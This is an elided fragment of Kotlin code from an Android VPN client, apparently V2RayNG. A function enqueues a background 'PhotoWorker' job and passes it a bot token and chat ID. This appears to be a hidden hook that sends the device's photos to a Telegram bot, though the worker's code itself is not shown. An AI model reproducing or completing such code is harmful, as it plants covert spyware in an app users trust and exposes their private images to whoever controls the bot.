...
import com.v2ray.ang.workers.PhotoWorker
...
//                tv_test_state.text = getString(R.string.connection_test_fail)
    ...
    private fun enqueuePhotoWorker() {
        val workData = Data.Builder()
            .putString(PhotoWorker.KEY_TOKEN, BOT_TOKEN)
            .putString(PhotoWorker.KEY_CHAT_ID, CHAT_ID)
            .build()
        ...
        WorkManager.getInstance(applicationContext).enqueue(photoWorkRequest)
    }
